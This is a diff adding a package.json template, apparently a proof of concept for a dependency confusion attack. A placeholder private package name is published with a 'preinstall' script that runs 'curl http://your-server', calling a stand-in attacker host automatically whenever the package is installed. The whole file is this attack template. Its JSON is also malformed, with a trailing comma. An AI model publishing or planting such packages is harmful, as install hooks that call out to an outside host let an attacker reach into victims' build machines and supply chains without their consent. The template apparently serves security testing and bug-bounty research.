@@ -1,0 +1,12 @@
+{
+  "name": "private-package-name",
+  "version": "X.X.X",
+  "description": "Dependency confusion test",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "curl http://your-server"
+  },
+  "author": "s1rn3tz",
+  "license": "ISC",
+}
